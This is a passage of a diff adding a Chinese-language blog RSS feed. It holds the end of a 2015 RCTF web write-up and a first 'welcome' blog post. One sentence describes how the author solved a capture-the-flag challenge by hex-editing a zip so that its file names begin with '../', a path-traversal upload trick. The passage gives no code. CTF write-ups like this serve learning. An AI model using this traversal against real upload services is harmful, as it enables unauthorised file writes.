+多上传几次发现给出的路径都不一样，于是尝试构造一个解压后存放至上一级目录的zip文件，用winhex编辑zip压缩包，在里面文件名前三位改成../，成功上传得到flag。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;这次RCTF只撸了web里的四道题，后面的xss和500分的题完全没时间看了。看题解发现xss不是很难，不知道时间足够能做出来不。个人成绩依然是60多名，从今年的绿盟举办的CTF开始，陆续打了几次都是这个名次，相信积累足够技术和经验后能有进步。&lt;/p&gt;
+</description>
+        <pubDate>Thu, 19 Nov 2015 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2015/11/19/rctf-writeup/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2015/11/19/rctf-writeup/</guid>
+        
+        <category>ctf</category>
+        
+        <category>web</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Welcome to My Blog</title>
+        <description>&lt;blockquote&gt;
+  &lt;p&gt;“黑喂狗。”&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;section&quot;&gt;前言&lt;/h2&gt;
+
+&lt;p&gt;终于开博客咯，人生第一个博客。&lt;/p&gt;
+
+&lt;p&gt;至于为什么挂在git上，其实是没钱买VPS &amp;gt;_&amp;lt;，先就酱吧。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-1&quot;&gt;正文&lt;/h2&gt;
+
+&lt;p&gt;之前在一个大牛(貌似是pithon牛)的博客里看到他说他每天为了更新博客，不得不去不断地发现新的东西，研究新的姿势。&lt;/p&gt;
+
+&lt;p&gt;看了后觉得很有道理。博客这种东西，不但是为了分享自己所得，也是为了促使自己进步。相信那句话，菜不要紧，整就行。&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;section-2&quot;&gt;后记&lt;/h2&gt;
+
+&lt;p&gt;博客的模板是照搬&lt;a href=&quot;https://github.com/Huxpro/huxpro.github.io&quot;&gt;HUX&lt;/a&gt;的博客。&lt;br /&gt;
+个人感觉挺好看的，再加上前端设计姿势缺乏又懒得动手，所以只好照搬了，顺便说一句，Jekyll真是个好东西。&lt;/p&gt;
+</description>
+        <pubDate>Thu, 19 Nov 2015 00:00:00 +0800</pubDate>
+        <link>http://dogewatch.github.io/2015/11/19/hello-git/</link>
+        <guid isPermaLink="true">http://dogewatch.github.io/2015/11/19/hello-git/</guid>
+        
+        <category>杂谈</category>
+        
+        
+      </item>
+    
+  </channel>
+</rss>
